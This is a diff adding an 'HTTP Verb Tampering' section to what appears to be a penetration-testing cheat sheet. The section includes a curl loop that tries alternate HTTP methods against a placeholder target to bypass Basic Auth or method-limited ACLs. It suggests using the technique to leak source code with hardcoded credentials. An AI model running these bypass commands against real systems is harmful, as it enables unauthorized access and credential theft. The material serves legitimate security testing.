@@ -140,6 +140,25 @@ POST /change_password
 # If 200, missing current-password check
 ```
 
+## HTTP Verb Tampering (auth bypass)
+
+When a path is protected by Basic Auth or a server-side ACL that only enforces on `GET` (or only on the verbs the developer thought of), swap the method to slip past the gate. Common when auth is wired to a specific `<Limit GET POST>` directive, a `location` block, or framework middleware keyed on the request method.
+
+```bash
+# Baseline: protected resource returns 401
+curl -i http://<TARGET_IP>/secret/
+
+# Try alternate verbs — any 200/redirect with body = bypass
+for m in HEAD POST PUT DELETE PATCH OPTIONS TRACE FOO; do
+  printf '%s: ' "$m"; curl -s -o /dev/null -w '%{http_code}\n' -X "$m" http://<TARGET_IP>/secret/
+done
+# HEAD returns no body but the same status as GET behind the ACL — use an arbitrary
+# verb (e.g. FOO) or POST when you need the response body. Apache <Limit> only guards
+# the listed methods; an unlisted verb is served unauthenticated.
+```
+
+Pair with content discovery: a verb-tampering bypass on a script or backup endpoint can leak source containing further secrets (hardcoded creds, API keys).
+
 ## Burp Intruder Reference
 
 **Attack types:** Sniper (single set, one position), Battering Ram (single set, all positions), Pitchfork (multiple sets, paired), Cluster Bomb (multiple sets, all combos).
